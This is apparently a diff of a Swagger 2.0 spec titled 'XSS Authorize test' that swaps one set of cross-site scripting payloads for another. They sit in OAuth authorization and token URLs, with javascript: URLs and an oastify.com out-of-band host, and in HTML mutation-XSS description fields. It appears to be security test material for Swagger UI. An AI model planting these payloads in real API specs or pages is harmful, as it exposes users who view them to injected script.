@@ -1,22 +1,14 @@
 swagger: "2.0"
-# Step 1 - define the security scheme
-components:
-  securitySchemes:
-    oAuthSample:    # <---- arbitrary name
-      type: oauth2
-      description: |
-        <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
-      flows:
-        implicit:   # <---- OAuth flow(authorizationCode, implicit, password or clientCredentials)
-          authorizationUrl: javascript:alert(document.domain)//
-          scopes:
-            read_pets: read your pets
-            write_pets: modify pets in your account
-# Step 2 - apply security globally...
-security: 
-  - oAuthSample: 
-    - write_pets
-    - read_pets
+securityDefinitions:
+  OAuth2:
+    type: oauth2
+    flow: accessCode
+    authorizationUrl: http://q7yi9f6xyb0gi3iy514xxklbf2lt9kx9.oastify.com/javascript:alert(document.domain)//
+    tokenUrl: http://q7yi9f6xyb0gi3iy514xxklbf2lt9kx9.oastify.com/javascript:alert(document.domain)//
+    scopes:
+      read: Grants read access
+      write: Grants write access
+      admin: Grants read and write access to administrative information
 info:
   version: "2.0"
   title: XSS Authorize test
@@ -27,4 +19,5 @@ paths:
     get:
       responses:
         200:
-          description: Successful response
+          description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<a href=j&#97v&#97script:&#97lert('xss')>ClickMe</a>"></form>
